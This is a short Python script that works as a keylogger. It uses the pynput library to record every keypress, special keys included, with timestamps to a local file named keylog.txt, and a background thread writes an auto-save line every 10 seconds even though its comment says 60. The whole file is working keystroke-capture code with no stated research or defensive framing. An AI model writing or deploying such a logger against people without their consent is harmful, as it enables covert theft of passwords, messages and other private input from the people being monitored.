from pynput.keyboard import Key, Listener
import logging
import os
import time

# User-defined configuration
output_file = "keylog.txt"
interval = 10  # Log keystrokes every 60 seconds

if not os.path.exists(output_file):
    open(output_file, "w").close()

logging.basicConfig(filename=output_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to log special keys and actions
def on_press(key):
    if hasattr(key, 'char'):
        logging.info(f"Key {key.char} pressed")
    else:
        logging.info(f"Special key {key} pressed")

# Function to periodically save logs
def save_logs_periodically():
    while True:
        time.sleep(interval)
        logging.info("[Auto Save]")

# Create a separate thread to periodically save logs
import threading
save_thread = threading.Thread(target=save_logs_periodically)
save_thread.daemon = True
save_thread.start()

# Main listener thread
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
